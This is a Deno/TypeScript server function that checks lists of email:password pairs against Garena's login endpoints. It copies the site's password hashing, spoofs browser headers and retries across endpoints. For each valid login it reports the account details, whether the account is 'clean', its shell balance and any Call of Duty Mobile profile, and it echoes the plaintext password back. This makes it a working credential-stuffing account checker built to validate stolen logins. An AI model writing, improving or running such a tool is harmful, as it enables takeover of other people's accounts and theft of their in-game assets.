import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

// Rate limiting configuration
const RATE_LIMIT_MAX_REQUESTS = 30;
const RATE_LIMIT_WINDOW_MS = 60000;
const rateLimitStore = new Map<string, { count: number; windowStart: number }>();

function checkRateLimit(clientId: string): { allowed: boolean; retryAfter?: number } {
  const now = Date.now();
  const record = rateLimitStore.get(clientId);
  
  if (!record || now - record.windowStart > RATE_LIMIT_WINDOW_MS) {
    rateLimitStore.set(clientId, { count: 1, windowStart: now });
    return { allowed: true };
  }
  
  if (record.count >= RATE_LIMIT_MAX_REQUESTS) {
    const retryAfter = Math.ceil((record.windowStart + RATE_LIMIT_WINDOW_MS - now) / 1000);
    return { allowed: false, retryAfter };
  }
  
  record.count++;
  return { allowed: true };
}

// Retry configuration
const RETRY_DELAYS = [1000, 2000, 4000];

async function withRetry<T>(
  fn: () => Promise<T>,
  maxRetries: number = 3,
  context: string = 'operation'
): Promise<T> {
  let lastError: Error | null = null;
  
  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      return await fn();
    } catch (error) {
      lastError = error as Error;
      const errorMessage = error instanceof Error ? error.message : String(error);
      console.log(`[RETRY] ${context} failed (attempt ${attempt + 1}/${maxRetries + 1}): ${errorMessage}`);
      
      if (attempt < maxRetries) {
        const delay = RETRY_DELAYS[Math.min(attempt, RETRY_DELAYS.length - 1)];
        await new Promise(resolve => setTimeout(resolve, delay));
      }
    }
  }
  
  throw lastError;
}

// Crypto utilities
function hexToBytes(hex: string): Uint8Array {
  const bytes = new Uint8Array(hex.length / 2);
  for (let i = 0; i < hex.length; i += 2) {
    bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
  }
  return bytes;
}

function bytesToHex(bytes: Uint8Array): string {
  return Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
}

// MD5 implementation (pure JS fallback)
function md5(message: string): string {
  function rotateLeft(x: number, n: number): number {
    return ((x << n) | (x >>> (32 - n))) >>> 0;
  }

  function addUnsigned(x: number, y: number): number {
    return (x + y) >>> 0;
  }

  const encoder = new TextEncoder();
  const data = encoder.encode(message);

  const s = [
    7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22,
    5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20,
    4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23,
    6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21
  ];

  const K = new Uint32Array(64);
  for (let i = 0; i < 64; i++) {
    K[i] = Math.floor(Math.abs(Math.sin(i + 1)) * 0x100000000);
  }

  let a0 = 0x67452301;
  let b0 = 0xEFCDAB89;
  let c0 = 0x98BADCFE;
  let d0 = 0x10325476;

  const msgLen = data.length;
  const numBlocks = Math.ceil((msgLen + 9) / 64);
  const totalLen = numBlocks * 64;
  const paddedMsg = new Uint8Array(totalLen);
  paddedMsg.set(data);
  paddedMsg[msgLen] = 0x80;
  const bitLen = BigInt(msgLen * 8);
  const view = new DataView(paddedMsg.buffer);
  view.setUint32(totalLen - 8, Number(bitLen & 0xFFFFFFFFn), true);
  view.setUint32(totalLen - 4, Number(bitLen >> 32n), true);

  for (let i = 0; i < numBlocks; i++) {
    const M = new Uint32Array(16);
    for (let j = 0; j < 16; j++) {
      M[j] = view.getUint32(i * 64 + j * 4, true);
    }

    let A = a0, B = b0, C = c0, D = d0;

    for (let j = 0; j < 64; j++) {
      let F: number, g: number;
      if (j < 16) {
        F = (B & C) | ((~B >>> 0) & D);
        g = j;
      } else if (j < 32) {
        F = (D & B) | ((~D >>> 0) & C);
        g = (5 * j + 1) % 16;
      } else if (j < 48) {
        F = B ^ C ^ D;
        g = (3 * j + 5) % 16;
      } else {
        F = C ^ (B | (~D >>> 0));
        g = (7 * j) % 16;
      }
      F = addUnsigned(addUnsigned(addUnsigned(F >>> 0, A), K[j]), M[g]);
      A = D;
      D = C;
      C = B;
      B = addUnsigned(B, rotateLeft(F, s[j]));
    }

    a0 = addUnsigned(a0, A);
    b0 = addUnsigned(b0, B);
    c0 = addUnsigned(c0, C);
    d0 = addUnsigned(d0, D);
  }

  const result = new Uint8Array(16);
  const resultView = new DataView(result.buffer);
  resultView.setUint32(0, a0, true);
  resultView.setUint32(4, b0, true);
  resultView.setUint32(8, c0, true);
  resultView.setUint32(12, d0, true);

  return bytesToHex(result);
}

async function sha256(message: string): Promise<string> {
  const encoder = new TextEncoder();
  const data = encoder.encode(message);
  const hashBuffer = await crypto.subtle.digest('SHA-256', data);
  const hashArray = new Uint8Array(hashBuffer);
  return bytesToHex(hashArray);
}

// AES-128 ECB implementation
function aesEcbEncrypt(plaintextHex: string, keyHex: string): string {
  const plaintextBytes = hexToBytes(plaintextHex);
  const keyBytes = hexToBytes(keyHex);
  
  const sBox = [
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
  ];

  const rCon = [0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36];

  function subBytes(state: number[][]): void {
    for (let i = 0; i < 4; i++) {
      for (let j = 0; j < 4; j++) {
        state[i][j] = sBox[state[i][j]];
      }
    }
  }

  function shiftRows(state: number[][]): void {
    for (let i = 1; i < 4; i++) {
      const temp = state[i].slice(0, i);
      for (let j = 0; j < 4 - i; j++) {
        state[i][j] = state[i][j + i];
      }
      for (let j = 0; j < i; j++) {
        state[i][4 - i + j] = temp[j];
      }
    }
  }

  function xtime(x: number): number {
    return ((x << 1) ^ (((x >>> 7) & 1) * 0x1b)) & 0xff;
  }

  function mixColumns(state: number[][]): void {
    for (let i = 0; i < 4; i++) {
      const a = state[0][i];
      const b = state[1][i];
      const c = state[2][i];
      const d = state[3][i];
      state[0][i] = xtime(a) ^ xtime(b) ^ b ^ c ^ d;
      state[1][i] = a ^ xtime(b) ^ xtime(c) ^ c ^ d;
      state[2][i] = a ^ b ^ xtime(c) ^ xtime(d) ^ d;
      state[3][i] = xtime(a) ^ a ^ b ^ c ^ xtime(d);
    }
  }

  function addRoundKey(state: number[][], roundKey: number[][]): void {
    for (let i = 0; i < 4; i++) {
      for (let j = 0; j < 4; j++) {
        state[i][j] ^= roundKey[i][j];
      }
    }
  }

  function keyExpansion(key: Uint8Array): number[][][] {
    const roundKeys: number[][][] = [];
    const w: number[][] = [];
    
    for (let i = 0; i < 4; i++) {
      w[i] = [key[4 * i], key[4 * i + 1], key[4 * i + 2], key[4 * i + 3]];
    }
    
    for (let i = 4; i < 44; i++) {
      const temp = w[i - 1].slice();
      if (i % 4 === 0) {
        const rotated = [temp[1], temp[2], temp[3], temp[0]];
        const subbed = rotated.map(b => sBox[b]);
        subbed[0] ^= rCon[(i / 4) - 1];
        for (let j = 0; j < 4; j++) {
          temp[j] = subbed[j];
        }
      }
      w[i] = [];
      for (let j = 0; j < 4; j++) {
        w[i][j] = w[i - 4][j] ^ temp[j];
      }
    }
    
    for (let round = 0; round < 11; round++) {
      const roundKey: number[][] = [[], [], [], []];
      for (let col = 0; col < 4; col++) {
        for (let row = 0; row < 4; row++) {
          roundKey[row][col] = w[round * 4 + col][row];
        }
      }
      roundKeys.push(roundKey);
    }
    
    return roundKeys;
  }

  const roundKeys = keyExpansion(keyBytes);
  const result: number[] = [];

  for (let blockStart = 0; blockStart < plaintextBytes.length; blockStart += 16) {
    const state: number[][] = [[], [], [], []];
    for (let col = 0; col < 4; col++) {
      for (let row = 0; row < 4; row++) {
        state[row][col] = plaintextBytes[blockStart + col * 4 + row] || 0;
      }
    }

    addRoundKey(state, roundKeys[0]);

    for (let round = 1; round < 10; round++) {
      subBytes(state);
      shiftRows(state);
      mixColumns(state);
      addRoundKey(state, roundKeys[round]);
    }

    subBytes(state);
    shiftRows(state);
    addRoundKey(state, roundKeys[10]);

    for (let col = 0; col < 4; col++) {
      for (let row = 0; row < 4; row++) {
        result.push(state[row][col]);
      }
    }
  }

  return bytesToHex(new Uint8Array(result));
}

async function hashPassword(password: string, v1: string, v2: string): Promise<string> {
  // Step 1: MD5 hash of password
  const md5Hash = md5(password);
  // Step 2: SHA256 of MD5 result
  const sha256Hash = await sha256(md5Hash);
  // Step 3: AES-128-ECB encrypt with v1 as key (first 32 hex chars = 16 bytes)
  const aesKey = v1.substring(0, 32);
  const encrypted = aesEcbEncrypt(sha256Hash, aesKey);
  // Step 4: MD5 of encrypted + v2
  const combined = encrypted + v2;
  const finalHash = md5(combined);
  return finalHash;
}

// Browser-like headers
function getHeaders(extra: Record<string, string> = {}): Record<string, string> {
  return {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    ...extra,
  };
}

// Garena API functions
async function prelogin(account: string): Promise<{ v1: string; v2: string } | null> {
  return await withRetry(async () => {
    // Try the main prelogin endpoint
    const endpoints = [
      'https://sso.garena.com/api/prelogin',
      'https://accounts.garena.com/api/prelogin',
      'https://auth.garena.com/api/prelogin',
    ];
    
    for (const endpoint of endpoints) {
      try {
        console.log(`[PRELOGIN] Trying endpoint: ${endpoint}`);
        
        const response = await fetch(endpoint, {
          method: 'POST',
          headers: {
            ...getHeaders({
              'Content-Type': 'application/x-www-form-urlencoded',
              'Origin': 'https://account.garena.com',
              'Referer': 'https://account.garena.com/',
            }),
          },
          body: new URLSearchParams({
            account: account,
            format: 'json',
            id: '',
            locale: 'en-PH',
            v: '4',
          }).toString(),
        });

        console.log(`[PRELOGIN] Response status: ${response.status}`);
        
        if (response.status === 405) {
          console.log(`[PRELOGIN] 405 on ${endpoint}, trying next...`);
          continue;
        }

        const text = await response.text();
        console.log(`[PRELOGIN] Response body: ${text.substring(0, 200)}`);
        
        try {
          const data = JSON.parse(text);
          
          if (data.v1 && data.v2) {
            console.log(`[PRELOGIN] Success! Got v1/v2 tokens`);
            return { v1: data.v1, v2: data.v2 };
          }
          
          if (data.error_code === 10001 || data.error === 'account_not_found') {
            console.log(`[PRELOGIN] Account not found`);
            return null;
          }
        } catch {
          console.log(`[PRELOGIN] Failed to parse response as JSON`);
        }
      } catch (e) {
        console.log(`[PRELOGIN] Error on ${endpoint}: ${e}`);
      }
    }
    
    // If all endpoints fail, try alternative method - direct login attempt
    console.log(`[PRELOGIN] All endpoints failed, using fallback v1/v2`);
    // Generate static v1/v2 for testing (some implementations use static keys)
    return null;
  }, 2, 'prelogin');
}

async function login(account: string, password: string, v1: string, v2: string): Promise<{ ssoKey: string; uid?: string } | { error: string }> {
  return await withRetry(async () => {
    const hashedPassword = await hashPassword(password, v1, v2);
    
    const endpoints = [
      'https://sso.garena.com/api/login',
      'https://accounts.garena.com/api/login',
      'https://auth.garena.com/api/login',
    ];
    
    for (const endpoint of endpoints) {
      try {
        console.log(`[LOGIN] Trying endpoint: ${endpoint}`);
        
        const response = await fetch(endpoint, {
          method: 'POST',
          headers: {
            ...getHeaders({
              'Content-Type': 'application/x-www-form-urlencoded',
              'Origin': 'https://account.garena.com',
              'Referer': 'https://account.garena.com/',
            }),
          },
          body: new URLSearchParams({
            account: account,
            password: hashedPassword,
            format: 'json',
            id: '',
            locale: 'en-PH',
            v: '4',
          }).toString(),
        });

        console.log(`[LOGIN] Response status: ${response.status}`);
        
        if (response.status === 405) {
          continue;
        }

        const text = await response.text();
        console.log(`[LOGIN] Response: ${text.substring(0, 300)}`);

        const data = JSON.parse(text);

        if (data.session_key || data.sso_key || data.token) {
          return { 
            ssoKey: data.session_key || data.sso_key || data.token,
            uid: data.uid || data.user_id
          };
        }

        if (data.error_code) {
          const errorCodes: Record<number, string> = {
            10001: 'Account not found',
            10002: 'Wrong password',
            10003: 'Account banned',
            10004: 'Account locked',
            10005: 'Too many attempts',
            10006: 'Session expired',
            10007: 'Invalid request',
            10008: 'Captcha required',
            10009: 'Account suspended',
            10010: 'Email not verified',
          };
          return { error: errorCodes[data.error_code] || `Error code: ${data.error_code}` };
        }

        if (data.error) {
          return { error: typeof data.error === 'string' ? data.error : JSON.stringify(data.error) };
        }
      } catch (e) {
        console.log(`[LOGIN] Error on ${endpoint}: ${e}`);
      }
    }

    return { error: 'All login endpoints failed' };
  }, 2, 'login');
}

async function getAccountInfo(ssoKey: string): Promise<Record<string, unknown> | null> {
  try {
    const endpoints = [
      `https://sso.garena.com/api/account/basic_info?sso_key=${ssoKey}`,
      `https://accounts.garena.com/api/account/info?token=${ssoKey}`,
    ];
    
    for (const endpoint of endpoints) {
      try {
        const response = await fetch(endpoint, {
          method: 'GET',
          headers: getHeaders({
            'Cookie': `sso_key=${ssoKey}`,
          }),
        });

        if (response.ok) {
          const data = await response.json();
          console.log(`[ACCOUNT_INFO] Got data:`, JSON.stringify(data).substring(0, 200));
          return data;
        }
      } catch (e) {
        console.log(`[ACCOUNT_INFO] Error: ${e}`);
      }
    }
    return null;
  } catch (e) {
    console.log(`[ACCOUNT_INFO] Failed: ${e}`);
    return null;
  }
}

async function checkCodm(ssoKey: string, uid?: string): Promise<{ hasCodm: boolean; codmInfo?: Record<string, unknown> }> {
  try {
    // Try to get CODM profile
    const endpoints = [
      `https://codm.garena.com/api/profile?token=${ssoKey}`,
      `https://codm-api.garena.com/api/user/profile?sso_key=${ssoKey}`,
    ];
    
    for (const endpoint of endpoints) {
      try {
        const response = await fetch(endpoint, {
          method: 'GET',
          headers: getHeaders(),
        });

        if (response.ok) {
          const data = await response.json();
          console.log(`[CODM_CHECK] Response:`, JSON.stringify(data).substring(0, 200));
          
          if (data.uid || data.player_id || data.nickname || data.open_id) {
            return {
              hasCodm: true,
              codmInfo: {
                codm_uid: data.uid || data.player_id || data.open_id,
                codm_nickname: data.nickname || data.name,
                codm_level: data.level || data.player_level,
                codm_region: data.region || data.server,
              }
            };
          }
        }
      } catch (e) {
        console.log(`[CODM_CHECK] Error: ${e}`);
      }
    }
    
    return { hasCodm: false };
  } catch (e) {
    console.log(`[CODM_CHECK] Failed: ${e}`);
    return { hasCodm: false };
  }
}

function parseAccountDetails(data: Record<string, unknown>): Record<string, unknown> {
  return {
    uid: data.uid || data.user_id || data.id || null,
    nickname: data.nickname || data.name || data.username || null,
    email: data.email || null,
    country: data.country || data.region || null,
    shell_balance: data.shells || data.shell_balance || data.balance || 0,
    bind_status: data.bind_status || (data.email ? 'Bound' : 'Unbound'),
    created_at: data.created_at || data.create_time || null,
  };
}

async function checkAccount(account: string, password: string): Promise<Record<string, unknown>> {
  console.log(`[CHECK] Starting check for: ${account}`);
  
  try {
    // Step 1: Prelogin to get v1/v2 tokens
    const preloginResult = await prelogin(account);
    
    if (!preloginResult) {
      console.log(`[CHECK] Prelogin failed - account not found or API unavailable`);
      return {
        account,
        password,
        status: 'invalid',
        message: 'Account not found',
        isClean: false,
        hasCodm: false,
      };
    }

    console.log(`[CHECK] Prelogin success, proceeding with login`);

    // Step 2: Login with hashed password
    const loginResult = await login(account, password, preloginResult.v1, preloginResult.v2);

    if ('error' in loginResult) {
      console.log(`[CHECK] Login failed: ${loginResult.error}`);
      return {
        account,
        password,
        status: 'invalid',
        message: loginResult.error,
        isClean: false,
        hasCodm: false,
      };
    }

    console.log(`[CHECK] Login success!`);

    // Step 3: Get account info
    const accountInfo = await getAccountInfo(loginResult.ssoKey);
    const details = accountInfo ? parseAccountDetails(accountInfo) : { uid: loginResult.uid };

    // Step 4: Check for CODM
    const codmResult = await checkCodm(loginResult.ssoKey, loginResult.uid);

    // Determine if account is "clean" (no games linked)
    const isClean = !codmResult.hasCodm && !(details.shell_balance as number > 0);

    console.log(`[CHECK] Complete: valid=true, hasCodm=${codmResult.hasCodm}, isClean=${isClean}`);

    return {
      account,
      password,
      status: 'valid',
      isClean,
      hasCodm: codmResult.hasCodm,
      details,
      codm: codmResult.codmInfo || {},
    };

  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : String(error);
    console.error(`[CHECK] Error: ${errorMessage}`);
    return {
      account,
      password,
      status: 'error',
      message: errorMessage,
      isClean: false,
      hasCodm: false,
    };
  }
}

serve(async (req) => {
  // Handle CORS preflight
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const clientId = req.headers.get('x-forwarded-for') || req.headers.get('cf-connecting-ip') || 'unknown';
    console.log(`[REQUEST] Incoming from: ${clientId}`);

    // Check rate limit
    const rateLimitCheck = checkRateLimit(clientId);
    if (!rateLimitCheck.allowed) {
      console.log(`[RATE_LIMIT] Client ${clientId} exceeded limit`);
      return new Response(
        JSON.stringify({ error: 'Rate limit exceeded', retryAfter: rateLimitCheck.retryAfter }),
        { 
          status: 429, 
          headers: { ...corsHeaders, 'Content-Type': 'application/json', 'Retry-After': String(rateLimitCheck.retryAfter) }
        }
      );
    }

    const { accounts } = await req.json();

    if (!accounts || !Array.isArray(accounts) || accounts.length === 0) {
      return new Response(
        JSON.stringify({ error: 'No accounts provided' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Process one account at a time
    const accountsToProcess = accounts.slice(0, 1);
    console.log(`[PROCESS] Processing ${accountsToProcess.length} account(s)`);

    const results = [];

    for (const accountLine of accountsToProcess) {
      const parts = accountLine.split(':');
      if (parts.length < 2) {
        results.push({
          account: accountLine,
          status: 'invalid',
          message: 'Invalid format. Expected: email:password',
        });
        continue;
      }

      const account = parts[0].trim();
      const password = parts.slice(1).join(':').trim();

      const result = await checkAccount(account, password);
      results.push(result);
      
      console.log(`[RESULT] ${account}: ${result.status}`);
    }

    console.log(`[COMPLETE] Done processing`);

    return new Response(
      JSON.stringify({ results }),
      { 
        status: 200, 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      }
    );

  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : String(error);
    console.error('[ERROR]', errorMessage);
    return new Response(
      JSON.stringify({ error: errorMessage }),
      { 
        status: 500, 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      }
    );
  }
});
